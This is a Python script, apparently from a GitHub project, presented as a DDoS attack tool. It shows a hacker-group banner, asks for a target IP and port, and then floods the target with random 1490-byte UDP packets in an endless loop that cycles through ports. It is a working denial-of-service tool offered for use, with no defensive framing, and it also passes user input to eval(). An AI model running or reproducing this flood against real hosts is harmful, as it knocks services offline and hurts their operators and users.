# AUTHOR : PANGLIMA JATIM 404
# TIME   : MAFIA TEKNOLOGI

# module
import os
import time
import socket
import scapy.all as scapy
import random

# Pembersih
os.system("clear")
# DDOS-Attack [ Panglima Jatim 404 ]
os.system("clear")

def display_banner():
    print("\033[1;92m")
    banner =     "──▄────▄▄▄▄▄▄▄────▄─────▄────▄▄▄▄▄▄▄────▄──────▄────▄▄▄▄▄▄▄────▄─\n"
    banner +=    "─▀▀▄─▄█████████▄─▄▀▀───▀▀▄─▄█████████▄─▄▀▀───▀▀▄─▄█████████▄─▄▀▀─\n"
    banner +=    "─────██─▀███▀─██───────────██─▀███▀─██────────────██─▀███▀─██────\n"
    banner +=    "───▄─▀████▀████▀─▄───────▄─▀████▀████▀─▄────────▄─▀████▀████▀─▄──\n"
    banner +=    "─▀█────██▀█▀██────█▀───▀█────██▀█▀██────█▀────▀█────██▀█▀██────█▀\n"
    banner +=  "  _     _     _     _       _     _     _     _     _     _    \n"
    banner +=  " / \   / \   / \   / \     / \   / \   / \   / \   / \   / \   \n"
    banner +=  "( D ) ( D ) ( O ) ( S )   ( A ) ( T ) ( T ) ( A ) ( C ) ( K )  \n"
    banner +=  " \_/   \_/   \_/   \_/     \_/   \_/   \_/   \_/   \_/   \_/   \n"
    print(banner)


display_banner()

# Terminal header settings and information
print("\033[36;1m")
print("╔══════════════════════════════════════════════════════════╗")
print("║\033[1;97mPembuat     :   Panglima Jatim 404                       \033[36;1m ║")
print("║\033[1;92mGithub      :   https://github.com/Projeckerror           \033[36;1m║")
print("║\033[1;93mTime        :   Mafia Teknologi                           \033[36;1m║")
print("║\033[36;1mCreated Date:  \033[1;97m 06-12-2023                                \033[36;1m║")
print('║\033[1;92mProject     :   \033[1;95mDDOS-Attack                               \033[36;1m║')
print("╚══════════════════════════════════════════════════════════╝")
print()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Lets define sock and bytes for our attack
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Type your ip and port number (find IP address using nslookup or any online website)
ip = input("\033[1;97mIP Target \033[0;31m═> ")
port = eval(input("\033[1;93mPort       \033[1;92m═> "))

# Lets start the attack
print("\033[1;97mDDOS ATTACK PANGLIMA JATIM 404")
print("\033[1;92mMemulai serangan pada =>", ip, " at port => ", port, "...")

time.sleep(5)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1

# End of the script
os.system("cls")
input("Press Enter to exit...")
